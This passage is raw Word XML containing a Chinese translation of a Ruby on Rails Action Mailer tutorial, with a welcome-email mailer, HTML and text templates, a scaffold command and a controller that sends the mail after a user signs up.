                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "notifications@example.com"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4032D2B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78CAB8A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welcome_email(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1419E5E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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4094F06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@url</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= "</w:t>
            </w:r>
            <w:hyperlink r:id="rId608" w:history="1">
              <w:r w:rsidRPr="004E5E0B">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://example.com/login</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CD8AA4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mail(:to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; user.email, :subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "欢迎来到我的网站")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F09BC2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0384649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4F08BAC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这里的方法就展示了一个简单的邮件项目，要想用上更多可用的选项，你可以在下文中可以找到一个完整的 Action Mailer 的参数设置选项表。而在这里</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF1A73B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="259"/>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default 哈希</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 这是一个邮件的必选参数，在这个例子里我们在类的顶部设定了</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:from</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>参数，这个参数是可以在每封具体邮件的内部修改的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA9347B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="259"/>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mail</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 在这个 email 文件中，我们对其设置了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:to</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:subject</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4F5FC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就和控制器一样，我们这个类的实例方法中定义的任何变量都将可以用在 View 中使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031A09F9"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2.1.3 创建 Mailer 视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FD3D2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我们在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/user_mailer/</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 建立一个 Email 的模板文件叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome_email.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，用 HTML 语言进行书写它：</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603C4962" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46207EC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&lt;!DOCTYPE html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67AD69B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&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02BCA8B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&lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AA1EA5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&lt;meta</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>content="text/html; charset=UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>http-equiv="Content-Type"</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50A7243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&lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3724DC9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&lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C3091A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&lt;h1&gt;Welcome to example.com, &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@user.name %&gt;&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E50C85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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C22006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You have successfully signed up to example.com,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F75561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your username is: &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@user.login %&gt;.&lt;br/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63757E4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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D7B8C7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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77C997E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To login to the site, just follow this link: &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@url</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0BD5B33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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="204827D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&lt;p&gt;Thanks for joining and have a great day!&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B2DDA3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&lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7919722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&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="03D815F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为你的 email 的文字部分分离出来会是不错的选择，在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/user_mailer/</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下建立一个文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome_email.text.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="30201EAC" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13CE49C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Welcome to example.com, &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@user.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BF1ADA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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31A0201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66FBB0D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You have successfully signed up to example.com,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60BC724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your username is: &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@user.login %&gt;.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="387850B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7ABDC7F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To login to the site, just follow this link: &lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@url</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5DADF54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75A7597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Thanks for joining and have a great day!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B456A7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当你调用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mail</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法之后， Action Mailer 将会为你检测两种模板文件(text 和 HTML)然后为你自动生成一个 email 文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11119FF0"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2.1.4 用户注册后自动发送邮件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C316BB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这里有几种方法来实现这件事情，有的人会建立一个 Rails 观察者模型来监视注册事件，还有一些人会在用户模型中实现这一功能。然而，在 Rails 3 中，mailer 有了第三种方法去实现它，与原来渲染视图之后通过 HTTP 协议发送，他们现在只需要通过 Email 协议直接发送邮件就可以了。因此，你可以在用户成功注册之后直接通过控制器来发送命令给 mailer 发送邮件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFE27C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而要做到这样的功能简直是易如反掌。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3749683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首先我们先建立一个 User scaffold：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2CD087D2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="162F0AA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rails generate scaffold user name:string email:string login:string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25B85CE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rake db:migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56F759D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这样我们就有了 用户模型了，我们将要编辑 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/users_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来让 UserMailer 为新建立的用户发送一封邮件，我们在 create 行为中当用户成功 save 之后调用了一个方法</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>UserMailer.welcome_email</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">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3C50882B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A3E125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UsersController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A52D59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POST /users</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06D90C5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POST /users.json</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FBA996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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="449BE8A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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= User.new(params[:user])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C39E9A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44C6477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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05B1AF1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if</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@user.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C9640E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Tell the UserMailer to send a welcome Email after save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B43841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UserMailer.welcome_email(@user).deliver</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="682FB22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08D2AB2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format.html { redirect_to(@user, :notice</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'User was successfully created.') }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14FC01D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format.json { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @user, :status</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :created, :location</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22DF10F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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="629B6DC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format.html { render :action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
